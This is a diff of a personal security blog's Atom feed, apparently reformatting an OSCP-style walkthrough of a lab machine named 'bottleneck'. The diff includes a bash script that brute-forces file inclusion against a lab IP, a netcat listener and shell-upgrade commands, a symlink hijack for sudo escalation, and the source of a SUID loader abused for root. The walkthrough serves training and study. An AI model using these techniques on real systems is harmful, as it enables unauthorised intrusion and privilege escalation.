@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-17T22:21:40+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;Lately, I’ve been thinking a lot about some job interviews I had recently, especially one at a really good organization near to my aria. The interviews were interesting and kind of tough, and they got me thinking about my work and where I’m headed.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-18T12:05:35+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;Lately, I’ve been thinking a lot about some job interviews I had recently, especially one at a really good organization near to my aria. The interviews were interesting and kind of tough, and they got me thinking about my work and where I’m headed.&lt;/p&gt;
 
 &lt;p&gt;The first interview was on Zoom and was all about technical stuff. They asked me about Wireshark, which is a tool for analyzing network traffic, and about different protocols like TCP, LDAP, and SMB2. They also asked about things like Linux processes and sockets, which are like communication channels between computers. It was a good chat, and I felt like I could talk to them easily. They even explained what comes next in their hiring process.&lt;/p&gt;
 
@@ -688,48 +688,46 @@ In my case I have used the following bash code, that should execute each code in
 ../../tmp/output
 ../tmp/output
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-    &lt;p&gt;Please note that this payload is python based since the &lt;code class=&quot;highlighter-rouge&quot;&gt;ids_strong_bvb.py&lt;/code&gt; should execute it. My original bash code is as follow
-```
-#!/bin/bash
-url=$1
-wordlist=$2
-loop=0
-[ $# != 2 ] &amp;amp;&amp;amp; { echo “Usage: $0 url wordlist”; exit 1; }
-checksum=”d41d8cd98f00b204e9800998ecf8427e”&lt;/p&gt;
+    &lt;p&gt;Please note that this payload is python based since the &lt;code class=&quot;highlighter-rouge&quot;&gt;ids_strong_bvb.py&lt;/code&gt; should execute it. My original bash code is as follow&lt;/p&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; 2 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; url wordlist&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;checksum&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;d41d8cd98f00b204e9800998ecf8427e&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;file&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;do
+ &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;expr&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$loop&lt;/span&gt; + 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Loop number: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$loop&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Test file: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] GET reqest: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;?t=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%s&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;f=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;| &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 0&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Script run: python /opt/ids_strong_bvb.py &amp;lt;/var/log/soc/'.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.' &amp;gt;/tmp/output 2&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Base64: &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;| &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 0&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;?t=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%s&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;f=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;| &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 0&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$loop&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-------------time: &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%s&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; ---------&quot;&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;------------read-file-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$loop&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;------------&quot;&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$loop&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.txt&quot;&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;filesum&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$loop&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.txt&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;md5sum&lt;/span&gt;|awk &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$checksum&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filesum&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;then
+     &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Found new file: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$loop&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.txt&quot;&lt;/span&gt;
+     &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] URL: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;?t=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%s&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;f=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;| &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+     &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$loop&lt;/span&gt;.txt
+     &lt;span class=&quot;nb&quot;&gt;break
+ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
+done&lt;/span&gt; &amp;lt; &lt;span class=&quot;nv&quot;&gt;$wordlist&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;You can see that my code do some checksum with the value &lt;code class=&quot;highlighter-rouge&quot;&gt;d41d8cd98f00b204e9800998ecf8427e&lt;/code&gt; which is the value of empty file. Then run it with the following command.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./lfi_base.sh http://192.168.166.22/image_gallery.php ./payload.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Also please note that I have been test it may times before I got it to work, this is really hard machine I think that requires a lot of concentration and understanding of code, in this case PHP.&lt;/p&gt;
   &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;while read file;
-do
-	loop=&lt;code class=&quot;highlighter-rouge&quot;&gt;expr $loop + 1&lt;/code&gt;
-	echo “[+] Loop number: $loop”
-	echo “[+] Test file: $file”
-	echo “[+] GET reqest: $url?t=$(date +%s)&amp;amp;f=$(echo -n “$file”| base64 -w 0)”
-	echo “[+] Script run: python /opt/ids_strong_bvb.py &amp;lt;/var/log/soc/’.$file.’ &amp;gt;/tmp/output 2&amp;gt;&amp;amp;1”;
-	echo “[+] Base64: $(echo -n $file| base64 -w 0)”
-	curl -s “$url?t=$(date +%s)&amp;amp;f=$(echo -n “$file”| base64 -w 0)” -o “$loop.txt”;
-	echo “————-time: $(date +%s) ———”
-	echo “————read-file-$loop————”
-	cat ./”$loop.txt”&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;filesum=$(cat &quot;$loop.txt&quot; | md5sum|awk '{print $1}')
-if [[ &quot;$checksum&quot; == &quot;$filesum&quot; ]];
-then
-	echo &quot;[+] Found new file: $loop.txt&quot;
-	echo &quot;[+] URL: $url?t=$(date +%s)&amp;amp;f=$(echo -n $file| base64)&quot;
-	cat $loop.txt
-	break
-fi done &amp;lt; $wordlist ``` You can see that my code do some checksum with the falue `d41d8cd98f00b204e9800998ecf8427e` which is the value of empty file. Then run it with the following command. ``` ./lfi_base.sh http://192.168.166.22/image_gallery.php ./payload.txt ``` Also please note that I have been test it may times before I got it to work, this is really hard machine I think that requires a lot of concentration and understanding of code, in this case PHP.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ol&gt;
   &lt;li&gt;
     &lt;p&gt;Initiation: so now after we have all set we can execute the code and on another terminal open listener for port 443.
 &lt;img src=&quot;/assets/images/op-003.gif&quot; alt=&quot;op-003.gif&quot; /&gt;
 Please note, the last step (step 4) was long since we had to research on the WEB more to understand how to exploit the reference point and run remote code to gain access.&lt;/p&gt;
   &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Interactive Shell: Since the reverse shell we have  so far is not so compatible we can make it full interactive with the following, first start listiner on the kali&lt;/p&gt;
+  &lt;li&gt;Interactive Shell: Since the reverse shell we have  so far is not so compatible we can make it full interactive with the following, first start listiner on the kali
     &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -nvlp 443
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
     &lt;p&gt;then we just need to run on the target.&lt;/p&gt;
@@ -739,91 +737,86 @@ Please note, the last step (step 4) was long since we had to research on the WEB
     &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bottleneck:~/html$ ^Z
 zsh: suspended  nc -nvlp 443
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-    &lt;p&gt;As you can see I have type ctrl+Z to take the shell to background, then we just need to run more commands.
-```
-└─$ stty -a |cut -d’;’ -f2-3 | head -n1
-rows 15; columns 116&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;└─$ stty raw -echo;fg&lt;br /&gt;
-    stty rows 15 columns 116
+    &lt;p&gt;As you can see I have type ctrl+Z to take the shell to background, then we just need to run more commands.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ stty -a |cut -d';' -f2-3 | head -n1
+rows 15; columns 116
+└─$ stty raw -echo;fg  
+                 stty rows 15 columns 116
 www-data@bottleneck:~/html$
-www-data@bottleneck:~/html$ python3 -c ‘import pty; pty.spawn(“/bin/bash”)’&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;After we finish we should have full interactive shell.
-
-7. System Enumeration: run full enumeration with linpeas, we can see one file that look interasting:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;User www-data may run the following commands on bottleneck:
-    (bytevsbyte) NOPASSWD: /var/www/html/web_utils/clear_logs&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;If we search for that clear_logs file we can see that it point to the following file:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;/opt/clear_logs.sh&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This is mean that this file can be run without inserting password of bytevsbyte user, if we look at the file we can find the following, which is used to remove the logs that created from the php file that we have compromised.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;www-data@bottleneck:~/html$ cat /var/www/html/web_utils/clear_logs
+www-data@bottleneck:~/html$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;After we finish we should have full interactive shell.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;System Enumeration: run full enumeration with linpeas, we can see one file that look interasting:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User www-data may run the following commands on bottleneck:
+ (bytevsbyte) NOPASSWD: /var/www/html/web_utils/clear_logs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;This is mean that we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; as bytevsbyte without insert any password if the path is to that clear_logs file, if we search for that clear_logs file we can see that it point to the following file:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/clear_logs.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;If we look at the file we can find the following, which is used to remove the logs that created from the php file that we have compromised.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bottleneck:~/html$ cat /var/www/html/web_utils/clear_logs
 #!/bin/bash
-rm -f /var/log/soc/intrusion_*&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;If we run `ll` or `ls -la` on the same directory we can see the following interesting about that file.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;www-data@bottleneck:~/html$ ls -la /var/www/html/web_utils/clear_logs
-lrwxrwxrwx 1 root root 18 Mar  2  2020 /var/www/html/web_utils/clear_logs -&amp;gt; /opt/clear_logs.sh&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You can see that with www-data we have permission to change that symbolic link.
-
-8. Escalation: what we need next after we found that we can change the link so it point to other location, we just need to point it to /bin/bash for grabing bash as bytevsbyte user and then run it with sudo.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;ln -sf /bin/bash /var/www/html/web_utils/clear_logs
-sudo -u bytevsbyte /var/www/html/web_utils/clear_logs&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;So now we can see that we are connected as bytevsbyte user.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;www-data@bottleneck:~/html$ sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
+rm -f /var/log/soc/intrusion_*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;If we run &lt;code class=&quot;highlighter-rouge&quot;&gt;ll&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; on the same directory we can see the following interesting about that file.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bottleneck:~/html$ ls -la /var/www/html/web_utils/clear_logs
+lrwxrwxrwx 1 root root 18 Mar  2  2020 /var/www/html/web_utils/clear_logs -&amp;gt; /opt/clear_logs.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;You can see the value permission on that file is &lt;code class=&quot;highlighter-rouge&quot;&gt;lrwxrwxrwx&lt;/code&gt;, which mean that with www-data we have permission to change that symbolic link.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Escalation: what we need next after we found that we can change the link so it point to other location, we just need to point it to /bin/bash for grabing bash as bytevsbyte user and then run it with sudo.
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ln -sf /bin/bash /var/www/html/web_utils/clear_logs
+sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;So now we can see that we are connected as bytevsbyte user.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bottleneck:~/html$ sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
 bytevsbyte@bottleneck:~/html$ id
 uid=1000(bytevsbyte) gid=1000(bytevsbyte) groups=1000(bytevsbyte),4(adm),24(cdrom),30(dip),46(plugdev),1001(tester)
 bytevsbyte@bottleneck:~/html$ whoami
 bytevsbyte
-bytevsbyte@bottleneck:~/html$&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-9. System Enumeration: so know we can run linpeas as bytevsbyte use, we expect to see out output with that one. We have found the two files
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;-rw-r—– 1 root tester 281 Sep 27  2019 /usr/test/testlib.c
--rwsr-x— 1 root tester 16528 Sep 26  2019 /usr/test/testlib&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;looking on the source code we can see the following
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;#include &lt;dlfcn.h&gt;
-#include &lt;unistd.h&gt;&lt;/unistd.h&gt;&lt;/dlfcn.h&gt;&lt;/p&gt;
-
-&lt;p&gt;int main(int argc, char &lt;em&gt;argv[]){
-    void *handle;
-    int (&lt;/em&gt;function)();
-    if(argc &amp;lt; 2)
-        return 1;
-    handle = dlopen(argv[1], RTLD_LAZY);
-    function = dlsym(handle, “test_this”);
-    function();
-    return 0;
-}&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I have told you that this is hard machine, since we need to check each code we found, so in that case the code should get arg, one or more then one, and it run dlsym which take the arg and run it with test_this, this is mean we have insert path for `so` file that contain function called &quot;test_this&quot; file.
-So, in out case, dlopen is used to open the shared object file &quot;&amp;lt;any_name&amp;gt;.so&quot; with lazy binding (RTLD_LAZY). Then, dlsym is used to obtain the address of the function named &quot;test_this&quot; within the shared object, since that binary is set on suid of 0, this is mean we can binding root shell with that.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
+bytevsbyte@bottleneck:~/html$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;System Enumeration: so now we can run linpeas as bytevsbyte user, we expect to see different output. We have found the two files
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-rw-r----- 1 root tester 281 Sep 27  2019 /usr/test/testlib.c
+-rwsr-x--- 1 root tester 16528 Sep 26  2019 /usr/test/testlib
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;looking on the source code we can see the following&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;dlfcn.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+int main(int argc, char *argv[]){
+ void *handle;
+ int (*function)();
+ if(argc &amp;lt; 2)
+     return 1;
+ handle = dlopen(argv[1], RTLD_LAZY);
+ function = dlsym(handle, &quot;test_this&quot;);
+ function();
+ return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
